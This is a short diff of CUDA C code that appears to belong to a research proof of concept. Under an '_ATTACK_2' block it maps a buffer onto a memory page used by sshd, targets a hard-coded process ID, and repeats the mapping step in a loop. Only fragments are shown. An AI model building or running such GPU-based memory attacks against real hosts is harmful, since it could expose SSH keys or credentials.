@@ -142,7 +142,7 @@ typedef struct hidden_driver_info
 typedef void (*s_funct) () ;
 int main(void) {
 
-#if 1
+#if 0
 	print_kernel<<<1,1>>>();
 	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
@@ -188,7 +188,7 @@ int main(void) {
 
 	//Set hidden Address:
 //	info_for_cuda_driver->start_addr = (unsigned long)base;
-	info_for_cuda_driver->pid = 16106;
+	info_for_cuda_driver->pid = 21993;
 	//info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;
 
 	char * d_real_buff;
@@ -239,6 +239,7 @@ CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 #define _ATTACK_2
 #ifdef _ATTACK_2
 
+	for (int i = 0; i < 10; i ++) {
 	/* Map this buffer to a memory page which currently maped by sshd. */
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)dump_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
 
@@ -257,6 +258,7 @@ CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 	CUDA_CHECK_RETURN(cudaDeviceSynchronize());
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 #endif
+	}
 
 	CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 
